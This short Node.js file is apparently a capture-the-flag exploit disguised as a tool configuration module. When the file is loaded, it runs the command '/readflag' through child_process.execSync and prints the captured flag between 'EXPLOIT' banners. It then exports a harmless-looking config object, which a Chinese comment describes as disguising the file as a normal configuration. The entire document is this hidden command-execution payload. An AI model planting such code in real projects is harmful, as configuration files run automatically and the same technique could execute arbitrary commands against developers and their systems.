const { execSync } = require('child_process');

console.log("--- EXPLOIT START ---");
try {
    // 尝试执行 /readflag 获取 flag
    const flag = execSync('/readflag').toString();
    console.log("FLAG CAPTURED:");
    console.log(flag);
} catch (e) {
    console.log("Execution failed:");
    console.log(e.message);
    if (e.stderr) console.log(e.stderr.toString());
}
console.log("--- EXPLOIT END ---");

module.exports = {
    // 伪装成正常配置
    files: ["**/*.js"]
};